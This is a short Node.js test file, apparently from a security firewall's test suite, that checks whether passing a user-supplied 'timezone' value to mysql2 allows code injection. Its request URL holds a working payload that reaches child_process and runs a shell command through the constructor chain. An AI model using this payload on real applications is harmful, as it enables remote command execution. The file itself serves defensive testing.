const { test } = require("node:test");
const { equal } = require("node:assert");

test("Vulnerable against SQL injection", async () => {
  process.env.AIKIDO_BLOCK = "true";
  process.env.AIKIDO_DEBUG = "true";
  require("@aikidosec/firewall");
  const { Hono } = require("hono");
  const mysql = require("mysql2/promise");

  const connection = await mysql.createConnection({
    host: "172.17.0.1",
    user: "root",
    database: "test",
    password: "123456",
  });

  const app = new Hono();

  app.get("/query", async (c) => {
    try {
      const timezone = c.req.query("timezone");

      return c.json(
        await connection.query({
          sql: `SELECT CURDATE();`,
          timezone,
        })
      );
    } catch (error) {
      return c.text(error.message, 500);
    }
  });

  const response = await app.request(
    "/query?timezone=');''.constructor.constructor('return process')().mainModule.require('child_process').execSync('nonexisting');console.log('"
  );

  equal(response.status, 500);
  equal(
    await response.text(),
    "Command failed: nonexisting\n/bin/sh: 1: nonexisting: not found\n"
  );

  connection.end();
});
